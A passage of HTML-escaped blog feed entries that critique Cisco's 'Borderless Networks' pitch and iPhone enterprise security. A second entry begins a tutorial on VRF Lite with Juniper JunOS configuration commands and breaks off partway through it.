is the shift to a more collaborative world, which is only made possible by
what we call an &amp;ldquo;intelligent, network-centric&amp;rdquo; world. This network-centric
world encompasses the whole range of communication experiences and seamlessly
delivers information. Consumers will access voice, the web, e-mail, and
video by any of the 14 billion devices that we think will be connected to the
internet by 2010, all loaded onto the network. In the very near future, for
example, you won&amp;rsquo;t need to hang up your cell phone if you want to switch to
a landline; you&amp;rsquo;ll stay connected as you change devices, as long as they&amp;rsquo;re
all connected to a network.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.cisco.com/survey/exit.html?http://discussionleader.hbsp.com/hbreditors/2008/10/cisco_ceo_john_chambers_on_tea.html&#34;&gt;Cisco CEO John Chambers talks about Cisco&amp;rsquo;s collaborative management model&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Cisco also has a &lt;a href=&#34;http://www.cisco.com/web/solutions/netsys/g2/index.html?POSITION=social+media&amp;amp;COUNTRY_SITE=us&amp;amp;CAMPAIGN=Transformers+Launch&amp;amp;CREATIVE=Borderless+Networks+to+Index&amp;amp;REFERRING_SITE=Twitter&#34;&gt;Virtual event&lt;/a&gt;
on Oct 20th for Borderless Networks, and have been encouraging people to
register via &lt;a href=&#34;http://twitter.com/CiscoGeeks&#34;&gt;twitter&lt;/a&gt; and emails for the
last two weeks.&lt;/p&gt;

&lt;div class=&#34;panel panel-default&#34; style=&#34;float: right;width: 450px;text-align: left;margin: 5px;margin-left: 20px;&#34;&gt;
  &lt;div class=&#34;panel-body&#34;&gt;

&lt;h4&gt;LUNCH - Securing the cloud: Building the borderless network&lt;/h4&gt;

An exploration into the “cloud” revealing the power of choice in email 
security. Learn how to harness all the benefits that the cloud has to 
offer while avoiding common pitfalls for early SaaS solutions. The 
crumbling walls of network perimeters are forcing organizations to architect 
new network designs to address the evolution of borderless networks. &lt;br&gt;
&lt;br&gt;
Attend this session and learn:&lt;br&gt;
- Embracing the change to borderless networks&lt;br&gt;
- Understanding Cisco&#39;s next-generation cloud security architecture&lt;br&gt;
- Realizing the power of choice in choosing an email security solution&lt;br&gt;
&lt;br&gt;
- Joel McFarland, senior manager in the product management team within the Security Technology Group at Cisco Systems&lt;br&gt;

&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a href=&#34;http://www.scmagazineus.com/Agenda-Day-1-2009/section/888/&#34;&gt;SC World Congress: Agenda Day 1&lt;/a&gt;&lt;/P&gt;
  &lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;I first learned of the Borderless Networks push during the
&lt;a href=&#34;http://www.scmagazineus.com/SC-World-Congress-2009/section/886/&#34;&gt;SC World Congress&lt;/a&gt;.  I
was there to get a preview of Borderless Networks as presented by Joel
McFarland.  The session description sounded interesting and as it was a
keynote there was nothing else to pull on my time.&lt;/p&gt;

&lt;p&gt;Two co-workers and I attended the session, but being a little late we had to
make our way to the very front of the room to find seats.  Up front we were able
to hear and see everything in great detail, but in hindsight this might have
not been the best place for us. There was no way Joel could have missed the
looks of skepticism on all three of our faces.&lt;/p&gt;

&lt;p&gt;Joel pushed the Cisco idea of Borderless Networks in many different ways, but
pointed to the &lt;a title=&#34;Figure 2: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;iPhone&lt;/a&gt;
as the game changer, the beginning of things to come.  Then iPhone and
salesforce.com became his prime example of how the mobile sales team are
almost completely disconnected from the enterprise network.  They access
leads, manage contacts, input orders, and exchange notes and information all
without even logging into the corporate network.  At this point, I looked to
my co-workers with a questioning expression and whispered the rhetorical
question &amp;ldquo;&lt;em&gt;No corporate login?&lt;/em&gt;&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;The example Joel used is common for a sales workforce, and is actively
encouraged in many environments, but this was just something that I have
always felt was wrong.  In many companies, sales leads are valuable
information and something that competitors and even other sales people
would actively try to gain access to.  When all access to this information
is controlled by an external party you are no longer able to apply your own
controls. In fact, you are beholden to the policies and procedures of the
provider.  Joel was one step ahead of me on this.  He pointed out the
problems that were playing through my head and countered that salesforce.com
can be made to use a corporation&amp;rsquo;s internal authentication methods (Active
Directory, RSA Token, etc.).  As such, your internal policies for access
and removal of access are once again in your control.  I conceded. Joel
is correct that salesforce.com can be brought into line with one&amp;rsquo;s internal
security policy, but he does not address the issue of the remote device-the
iPhone itself.&lt;/p&gt;

&lt;h4 id=&#34;borderless:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Borderless&lt;/h4&gt;

&lt;p&gt;Let me come back to the iPhone in a bit, I want to point out another slide
that came up during this iPhone praise.  In
&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;Figure 2&lt;/a&gt;
I have created a combined version of the two slides Joel was showing to
demonstrate the future of networking (I have recreated them from memory,
but its close enough for this post).&lt;/p&gt;

&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 42px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;500&#34; height=&#34;400&#34; /&gt; &lt;/a&gt;
&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 2: Before &amp; After&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/before-after_borderless.png&#34;&gt;Figure 2: Before &amp; After&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;p&gt;In Figure 2, we have the &lt;strong&gt;before&lt;/strong&gt; and &lt;strong&gt;after&lt;/strong&gt; sections.  According to
Joel, currently the &lt;strong&gt;before&lt;/strong&gt; example is a good summary of how most enterprises
networks allow access into and between their networks.  This Joel and I agree on.&lt;/p&gt;

&lt;p&gt;As seen in the &lt;strong&gt;before&lt;/strong&gt; section, you have a defined entry point into the network
from outside, where all external resources gain access.  This is your border between
&amp;ldquo;&lt;em&gt;us&lt;/em&gt;&amp;rdquo; and &amp;ldquo;&lt;em&gt;them&lt;/em&gt;&amp;rdquo;.  In the examples, both the remote home desktop and iPhone
access the network and are allowed across past the border only if proper authentication
and authorization have take place.  Once completed, the remote device is granted
access to the resources that are allowed for it to function as an effective job
tool: access to to internet via internal proxy, access of files in the London
office, or logging into the salesforce.com website.  The key thing is that all
access flows through this single point of entry.&lt;/p&gt;

&lt;p&gt;By restricting access for remote devices to a single point, we are able
to overcome some technical shortcomings and greatly reduce the vectors
of attack for the network. NAT is required due to the limited number
of publicly addressable addresses. Thus end-to-end connectivity is not
an option for the remote devices. The use of IPSec for transport and
assigning a RFC1918 address to the remote device end of the IPSec tunnel
allows one to overcome the NAT limitations. This gives you remote device
end-to-end connectivity within the enterprise network. By using this
method the network administrators are able to capture and monitor at a
single point all access into and out of the network. NAC, IPS/IDS, and
other methods of monitoring are commonly deployed here.&lt;/p&gt;

&lt;p&gt;With the &lt;strong&gt;after&lt;/strong&gt; diagram of Figure 2, we see the future as Cisco/Joel
see it. This is where all resources are able to access all other
resources; also known as complete end-to-end connectivity. Joel did not
say how this was to be achieved, but given the network diagram it&amp;rsquo;s not
hard to surmise that Cisco is planning a big push for IPv6. IPv6 will
allow for this type of network, and will bring down the NAT boundary.
With it the technical limitation of too few addresses for end-to-end
connectivity on the Internet is eliminated and things can get a lot more
complex as we see in the &lt;strong&gt;after&lt;/strong&gt; section of the diagram.&lt;/p&gt;

&lt;p&gt;On the &lt;strong&gt;after&lt;/strong&gt; diagram you see end-to-end connectivity to each
resource both inside the network and outside. We have an iPhone going
directly to salesforce.com, directly accessing a file in the London
office, and able to access all the data that it could ever need. What
about limiting access to resources? How do you make sure that a remote
home desktop does not start copying all of the data from the London
office, NYC office, and salesforce.com to a remote site? What if the
desktop is infected with malware? How do you log the activity of the
remote device access? All the questions become much harder when you have
completed end-to-end connectivity, and historically we have learned it
becomes an even larger problem when there are remote devices involved.&lt;/p&gt;

&lt;p&gt;All the questions I have asked about the security of the &lt;strong&gt;after&lt;/strong&gt;
sections can be answered with products already on the market and in
fact are recommended for use in both networks. The problem becomes the
scale that is needed to protect and defend a network that has complete
end-to-end connectivity. Once again, going back to the &lt;strong&gt;after&lt;/strong&gt;
diagram, only taking into account remote device access, the number of
policies that needs to be maintained, protected, and monitored goes from
1 to 4. Now a growth of 400% is big, but almost manageable. If you start
to think about a small enterprise with 20 offices, 2 datacenters, and
200 remote users, the problem of scale is instantly untenable.&lt;/p&gt;

&lt;p&gt;IPv6 will solve a lot of problems for networks as the need for NAT
will go away and devices will be able to directly address each other
across networks and boundaries, but as with just about everything there
are side effects. Keeping control of access into and out your network
is the first line of defense and with IPv6 this becomes a policy and
enforcement issue even if it is no longer a technical requirement.&lt;/p&gt;

&lt;h4 id=&#34;the-iphone-key-to-the-borderless-network:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;The iPhone, Key to the Borderless Network&lt;/h4&gt;

&lt;p&gt;Joel said he likes his iPhone and from the huge number of videos from Cisco featuring an iPhone it&amp;rsquo;s safe to assume Cisco does too.  During the keynote Joel pointed out the iPhone a few times in a number examples and in general with heavy praise.  Joel and I agree the iPhone is an amazing device, an important step forward in mobile computing.  After this Joel and I begin to disagree, namely around one key point: &amp;ldquo;&lt;em&gt;The iPhone is a game changer.&lt;/em&gt;&amp;rdquo;  I think that statement needs to add &amp;ldquo;&lt;em&gt;for the consumer market&lt;/em&gt;&amp;rdquo;.&lt;/p&gt;

&lt;div class=&#34;wp-caption&#34; style=&#34;float: left;margin: 5px;margin-left: 5px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 3: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;200&#34; height=&#34;330&#34; /&gt; &lt;/a&gt;
&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 3: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;Figure 3: The iPhone&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;

&lt;p&gt;iPhones are enabling users to use the Internet from
almost anyplace; it&amp;rsquo;s one of the most popular cameras on
&lt;a href=&#34;http://www.flickr.com/cameras/&#34;&gt;flickr&lt;/a&gt;, has a huge list of
applications, and, for some people, a complete replacement for
the traditional computer. While its strong points work well
in the consumer market, in the enterprise markets it&amp;rsquo;s a very
different beast. In fact the strongest points for the iPhone in
the consumer market are security concerns for the enterprise.
Application controls are limited, centralized control is even more
limited, and encryption of the data residing on the devices is a
&lt;a href=&#34;http://www.wired.com/gadgetlab/2009/07/iphone-encryption/&#34;&gt;problem&lt;/a&gt; on
the most fully featured phone to date.&lt;/p&gt;

&lt;p&gt;Devices like the iPhone should be thought of less as a phone and more as
a laptop. With that comes all the same protections and controls that we
use to mitigate risk on an enterprise laptop. Here is a quick list of
what I expect from a laptop and by extension from an iPhone for it to
become a viable remote access device in the enterprise environment:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Virus and Malware software with centralized reporting&lt;/li&gt;
&lt;li&gt;Secure communications for the device; both internal resources and the ability to define policies&lt;/li&gt;
&lt;li&gt;Strong Data Encryption on the device&lt;/li&gt;
&lt;li&gt;Ability to do remote kill of device&lt;/li&gt;
&lt;li&gt;Application installation and run controls&lt;/li&gt;
&lt;li&gt;Web Filter/Proxy controls&lt;/li&gt;
&lt;li&gt;Access controls, password complexity settings and password failure data destruction&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Some of the areas listed are available on the iPhone, but none of them are near complete and ready for everyday use in an enterprise.  &lt;a href=&#34;http://www.rim.com/&#34;&gt;Research In Motion&lt;/a&gt; (RIM) dominates the enterprise market for the reasons I have listed here.  RIM via the BlackBerry Enterprise Server (BES) gives the enterprise complete control of every device that connects via a centralized management station.  BES also does network traffic correctly in that all devices came back to the BES at a single point of entry into the enterprise.  This allows an enterprise to place additional control directly attached to the BES and not with multiple devices all over the network.  RIM&amp;rsquo;s BES product represents the minimum level of security that should be expected for remote access of phone like devices. I would go so far as to say it should be the starting standard for how remote access devices should behave.&lt;/p&gt;

&lt;p&gt;The iPhone might be the start of things to come, but in no way is it even close to ready for the enterprise market.&lt;/p&gt;

&lt;h2 id=&#34;why:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Why?&lt;/h2&gt;

&lt;p&gt;Cisco&amp;rsquo;s push with Borderless Networks is either something that they haven&amp;rsquo;t completely vetted from a security perspective or the security strategy isn&amp;rsquo;t completely explained in the marketing.  The huge increase in the number of points needing protection, the corresponding increase in the policy and management, and management data flow and access controls are areas that need addressing.  These are problems we still having troubles controlling with our current network deployments.  Unless Cisco has a magic bullet coming out of their research and development departments, I don&amp;rsquo;t see how this move to Borderless Networks is even possible.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>VRF is the new Black: How I Learned to Stop Worrying and Love the Complexity</title>
      <link>https://jeremyrossi.com/blog/2009/08/15/vrf-is-the-new-black-how-i-learned-to-stop-worrying-and-love-the-complexity/</link>
      <pubDate>Sat, 15 Aug 2009 00:00:00 +0000</pubDate>
      
      <guid>https://jeremyrossi.com/blog/2009/08/15/vrf-is-the-new-black-how-i-learned-to-stop-worrying-and-love-the-complexity/</guid>
      <description>

&lt;p&gt;Breaking up your network &lt;em&gt;&amp;ldquo;is good,&amp;rdquo;&lt;/em&gt; we all know this, and VLANs have
traditionally been used to segment a network to help with maintenance,
management, and security; but, they are not the only game in town and often the
wrong place to break your network into smaller and more efficient pieces. VPN
Routing and Forwarding (VRF) can do the same for layer 3 infrastructure that
VLANs do for layer 2. By allowing you to create and manage separate routing
tables within a single physical router, they truly bring virtualization and
segmentation to all points on your network. As with any technology that adds
layers, complexity can become a problem, but you already know this.&lt;/p&gt;

&lt;h2 id=&#34;table-of-contents:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Table of Contents&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#vrf-intro&#34;&gt;Virtual Routing and Forwarding (VRF)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#vrf-setup&#34;&gt;VRF Lite Setup&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#setup-junos&#34;&gt;Juniper JunOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#setup-ios&#34;&gt;Cisco IOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#setup-screenos&#34;&gt;Juniper ScreenOS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;vrf-intro:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Virtual Routing and Forwarding (VRF)&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;It&amp;rsquo;s incredibly obvious, isn&amp;rsquo;t it? A foreign substance is introduced into our
precious bodily fluids without the knowledge of the individual, and certainly
without any choice.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Gen Jack D. Ripper&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Virtual routing and forwarding (VRF) is a technology included in network routers
that allows multiple instances of a routing table to exist in a single router
all while working simultaneously.&lt;/p&gt;

&lt;p&gt;Their are two types of VRFs: &lt;em&gt;&amp;ldquo;VRF&amp;rdquo;&lt;/em&gt; and &lt;em&gt;&amp;ldquo;VRF Lite.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;VRF Lite is just a subset of VRF without all the protocols used for creation of
VPNs between routers, namely MPLS. VRFs are very common in service providers
networks and at some point nearly all internet traffic passes through a VRF or
two.&lt;/p&gt;

&lt;p&gt;VRF Lite allows for interfaces on a physical router to belong to a routing instance.  This routing instance has its own forwarding table, ARP entries, and everything else needed to make a forwarding decision.  It can simply be thought of as a router within a router (&lt;em&gt;&lt;a title=&#34;Routers in router&#34; rel=&#34;lightbox&#34; href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/05/router-in-router.png&#34;&gt; Figure 1&lt;/a&gt;&lt;/em&gt;).&lt;/p&gt;

&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 60px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Routers in router&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/router-in-router.png&#34;&gt; &lt;img src=&#34;https://jeremyrossi.com/img/router-in-router.png&#34; border=&#34;0&#34; alt=&#34;router in router.png&#34; width=&#34;200&#34; height=&#34;135&#34; /&gt;
&lt;p class=&#34;wp-caption-text&#34;&gt;Figure 1: Routers within Router&lt;/p&gt;

&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;This structure makes VRFs useful for many applications and as a solution to
quite a few tough network design issues. It can be used to improve the network
in the following ways:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#vrf-intro-seg&#34;&gt;Segmentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#vrf-intro-mgmt&#34;&gt;Management and Control&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#vrf-intro-sec&#34;&gt;Security&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;vrf-intro-seg:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Segmentation&lt;/h3&gt;

&lt;p&gt;Layer 2 segmentation based on VLANs and firewalls is showing strains and being
pushed beyond reasonableness when it comes to how a network architecture should
be built. A good example of this is 10 Gig and 1 Gig Ethernet MANs&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7aab83205c9396acb0cb1eb2f8393798:1&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:7aab83205c9396acb0cb1eb2f8393798:1&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; that span
multiple buildings and datacenters into a single campus. An overview of a large
campus network can been seen in &lt;a title=&#34;Large MAN Overview&#34; rel=&#34;lightbox&#34;
href=&#34;http://praetorianprefect.com/wp-content/uploads/2009/04/man-example.png&#34;&gt;Figure 2&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In our example network, creating wired guest access would require the use
of firewalls in each building or extending VLANs between buildings to the
centralized firewalls in the datecenter. Both options have downsides that VRFs
would be better at solving.&lt;/p&gt;

&lt;div class=&#34;wp-caption&#34; style=&#34;float: right;margin: 5px;margin-left: 60px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 1: Large MAN Overview&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/man-example.png&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/man-example.png&#34; border=&#34;1&#34; alt=&#34;MAN Network Diagram&#34; width=&#34;200&#34; height=&#34;204&#34; /&gt; &lt;/a&gt;
&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 1: Large MAN Overview&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/man-example.png&#34;&gt;Figure 2: Large MAN Overview&lt;/a&gt;&lt;/p&gt;

&lt;/div&gt;

&lt;p&gt;In the case of extending VLANs between buildings this would have the campus
network design rely on Spanning Tree and layer 2 protocols to provide a
loop-free environment. In the case of a large network such as our example, this
could lead to long failover times during hardware failure, while also not making
full use of all available network bandwidth.&lt;/p&gt;

&lt;p&gt;The use of firewalls mitigates most of the network utilization and failure times
by making use of layer 3 routed campus design, but this comes at a large cost.
Namely, the cost is incurred in maintenance and raw hardware costs for large
firewalls that are able to deal with 10 Gig and 1 Gig ethernet line rates. The
use of access-lists are often supplemented for firewalls to reduce costs, but
this approach is fraught with issues and access-lists are never reviewed often
enough.&lt;/p&gt;

&lt;p&gt;A VRF based solution for a wired guest network on a large campus would
allow guest traffic to be routed to the firewalls in the datacenters via
routing policy while still being segmented away from production traffic. By
leveraging VRFs none of the aforementioned compromises are required to keep
this separation. The production network is able to fully utilize all available
links and not relay on spanning tree protocol between sites for a loop free
environment.&lt;/p&gt;

&lt;h3 id=&#34;vrf-intro-mgmt:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Management and Control&lt;/h3&gt;

&lt;p&gt;For managing devices on a network, there is a need for out of band (OOB)
connections. There really is no other sure-fire way of gaining access during
a truly catastrophic event other than this tried and true modem/console
connection. But for the daily running and maintenance of the network, OOB just
can not keep up with the needs of daily maintenance and the amount of traffic
generated by NetFlow, logging, ftp/tftp backups, and scp (secure copy) of new
images. To complete these high bandwidth functions, most companies I have seen
and worked with just resort to using the network that servers and even desktops
traffic utilize. This traffic in many cases is highly sensitive and really
should not be available to anyone outside of authorized users.&lt;/p&gt;

&lt;p&gt;VRFs can help to move this traffic out of the primary network and into a second
network that only services management functions and has no direct access to
the Internet, desktops, or other uncontrolled resources. In fact, Cisco is now
adding VRF management ports to some of their newer devices&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7aab83205c9396acb0cb1eb2f8393798:4&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:7aab83205c9396acb0cb1eb2f8393798:4&#34;&gt;2&lt;/a&gt;&lt;/sup&gt;. The use of ACL&amp;rsquo;s
and other forms of control and logging are still needed, but they become simpler
to keep updated and are normally far less complicated when production traffic is
neither expected nor allowed.&lt;/p&gt;

&lt;h3 id=&#34;vrf-intro-sec:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;Security&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;I&amp;hellip; I don&amp;rsquo;t know exactly how to put this, sir, but are you aware of what a serious breach of security that would be?
I mean, he&amp;rsquo;ll see everything, he&amp;rsquo;ll&amp;hellip; he&amp;rsquo;ll see the Big Board!&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Gen &amp;quot;Buck&amp;quot; Turgidson&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;VRFs allow for complete separation of different routing instances from one
another. This simple and effective concept of hiding networks from each other
and limiting the ability of devices from interacting outside of defined
boundaries creates a more secure network. A good example of this would be a
voice network within a campus. In general, there is very little reason for VoIP
end points to speak to anything other than the voice gateway and each other.
Moving of voice traffic to a VRF allows for gateways to still interact and even
direct device-to-device interconnection, while greatly reducing the attack
vectors.&lt;/p&gt;

&lt;p&gt;VRFs do increase the surface area of your network devices due to the increased
number of addressable interfaces on each hardware device. But I would counter
this with the fact that the network is divided into more domain specific
networks. The ACL and protection measures required become much simpler to
implement and keep up to date. A good and simple example of this would be to
just block all management functions for anything outside of the management VRF.&lt;/p&gt;

&lt;h2 id=&#34;vrf-setup:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;VRF Lite Setup&lt;/h2&gt;

&lt;p&gt;VRF Lite is supported on most modern network hardware, but I personally have not used them
outside of &lt;a href=&#34;http://juniper.net/products/junos/&#34;&gt;Juniper JunOS&lt;/a&gt;,
&lt;a href=&#34;http://www.juniper.net/techpubs/software/screenos/screenos6.1.0/index.html&#34;&gt;Juniper ScreenOS&lt;/a&gt;,
and Cisco &lt;a href=&#34;http://cisco.com/go/ios&#34;&gt;IOS&lt;/a&gt;.  Each Platform/Company has it&amp;rsquo;s own
naming&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7aab83205c9396acb0cb1eb2f8393798:3&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:7aab83205c9396acb0cb1eb2f8393798:3&#34;&gt;3&lt;/a&gt;&lt;/sup&gt; convention for the this feature, but the concept is the same in each.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;Gentlemen, you can&amp;rsquo;t fight in here! This is the War Room.&amp;rdquo;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Pres Merkin Muffley&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#setup-junos&#34;&gt;Setup on Juniper JunOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#setup-ios&#34;&gt;Setup on Cisco IOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#setup-screenos&#34;&gt;Setup on Juniper ScreenOS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;setup-junos:7aab83205c9396acb0cb1eb2f8393798&#34;&gt;VRF Lite Setup on Juniper JunOS&lt;/h3&gt;

&lt;p&gt;First we need to setup some basic interfaces for later use. We will not be
assigning them an IP address as I do not want to pollute the global routing
table&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:7aab83205c9396acb0cb1eb2f8393798:2&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:7aab83205c9396acb0cb1eb2f8393798:2&#34;&gt;4&lt;/a&gt;&lt;/sup&gt;. We will be using VLANs on ethernet interfaces to break up the router
&lt;code&gt;junos-1&lt;/code&gt; into three virtual routers.&lt;/p&gt;

&lt;p&gt;Enable VLAN tagging on the interfaces and create some sub interfaces.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set interfaces fe-0/0/0 vlan-tagging
set interfaces fe-0/0/0 unit 100 vlan-id 100
set interfaces fe-0/0/0 unit 100 description &amp;quot;Untrust&amp;quot;
set interfaces fe-0/0/0 unit 200 vlan-id 200
set interfaces fe-0/0/0 unit 200 description &amp;quot;Trust&amp;quot;
set interfaces fe-0/0/0 unit 300 vlan-id 300
set interfaces fe-0/0/0 unit 300 description &amp;quot;DMZ&amp;quot;
set interfaces fe-0/0/0 unit 400 vlan-id 400
set interfaces fe-0/0/0 unit 400 description &amp;quot;Trust&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The verify the results and commit the changes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
jrossi@junos-1# show interfaces
fe-0/0/0 {
	vlan-tagging;
	unit 100 {
		description Untrust;
		vlan-id 100;
	}
	unit 200 {
		description Trust;
		vlan-id 200;
	}
	unit 300 {
		description DMZ;
		vlan-id 300;
	}
	unit 400 {
		description Trust;
		vlan-id 400;
	}
}

[edit]
jrossi@junos-1# commit
commit complete

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let&amp;rsquo;s create three new routing-instances: Trust, Untrust, and DMZ. The
&lt;code&gt;instance-type&lt;/code&gt; supports quite a few option types on JunOS, but to to create a
VRF Lite instance we just need to use &lt;code&gt;virtual-router&lt;/code&gt;. We also need to assign
interfaces to each newly created instance. This is very different than in Cisco
IOS in that one configures VRF in the interface configuration hierarchy.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;show routing-instances
set routing-instances Trust instance-type virtual-router
set routing-instances Trust interface fe-0/0/0.200
set routing-instances Trust interface fe-0/0/0.400
set routing-instances Untrust instance-type virtual-router
set routing-instances Untrust interface fe-0/0/0.100
set routing-instances DMZ instance-type virtual-router
set routing-instances DMZ interface fe-0/0/0.300

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;View the results and commit the change.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[edit]
jrossi@junos-1# show routing-instances
Trust {
	instance-type virtual-router;
	interface fe-0/0/0.200;
	interface fe-0/0/0.400;
}
Untrust {
	instance-type virtual-router;
	interface fe-0/0/0.100;
}
DMZ {
	instance-type virtual-router;
	interface fe-0/0/0.300;
}

[edit]
jrossi@junos-1# commit
commit complete

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, we have the interfaces configured and set up without addresses. If we look
at the routing table nothing shows up because we have not enabled any interface
families. Once we add address to the &lt;code&gt;family inet&lt;/code&gt; interface configuration, the
routing table will begin to take shape.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jrossi@junos-1# run show route

inet.0: 6 destinations, 6 routes (6 active, 0 holddown, 0 hidden)
+ = Active Route, - = Last Active, * = Both

0.0.0.0/0          *[Static/5] 03:47:47
                    &amp;gt; to 10.4.37.1 via fe-0/0/1.0
10.4.37.0/24       *[Direct/0] 1d 19:35:26
                    &amp;gt; via fe-0/0/1.0
10.4.37.9/32       *[Local/0] 1d 19:35:26
                      Local via fe-0/0/1.0
192.168.5.0/24     *[Direct/0] 1d 13:13:18
                    &amp;gt; via fe-0/0/1.0
192.168.5.123/32   *[Local/0] 1d 13:13:18
                      Local via fe-0/0/1.0
224.0.0.5/32       *[OSPF/10] 1d 12:50:00, metric 1
                     MultiRecv

__juniper_private2__.inet.0: 1 destinations, 1 routes (0 active, 0 holddown, 1 hidden)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let&amp;rsquo;s add some interface &lt;code&gt;family inet&lt;/code&gt; addresses. I am going to use overlapping
address ranges to show that when VRF is used they do not interfere with each
other.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;set interfaces fe-0/0/0 unit 100 family inet address 10.10.10.1/24
set interfaces fe-0/0/0 unit 200 family inet address 172.16.10.1/24
set interfaces fe-0/0/0 unit 300 family inet address 10.10.10.1/24
set interfaces fe-0/0/0 unit 400 family inet address 192.168.10.1/24
&lt;/code&gt;&lt;/pre&gt;

